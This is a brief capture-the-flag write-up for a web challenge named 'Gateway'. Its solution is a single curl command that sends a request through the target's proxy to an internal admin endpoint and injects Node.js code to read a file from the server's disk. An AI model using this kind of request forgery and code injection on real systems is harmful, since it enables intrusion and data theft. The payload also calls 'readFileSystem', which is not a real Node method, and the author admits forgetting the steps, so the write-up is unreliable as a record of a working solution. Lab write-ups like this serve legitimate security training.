# Gateway
## Challenge
- **Solves**: 19
- **Name**: Gateway
- **Points**: 116

## Description
Jeg synes du skal (eval)uere min nye super krypterede proxy:  
[http://gateway.hkn](http://gateway.hkn)  

**NOTE**: Create a user and find the VPN and Browser LABs on Campfire Labs

## Solution
I used this command to get the flag and bypass the blacklist:  
```bash
curl -X POST http://gateway.hkn/fetch -d "site=http://0.0.0.0/admin?command=require('fs').readFileSystem('/home/node/app/flag.txt', 'utf8')"
```

## Flag
`DDC{wh1tel1sts_ar3_c00l}`

**Note**: This writeup is a little short. I don’t remember all the steps to how I did it. If you really want the full writeup, then DM me and I’ll see what I can do.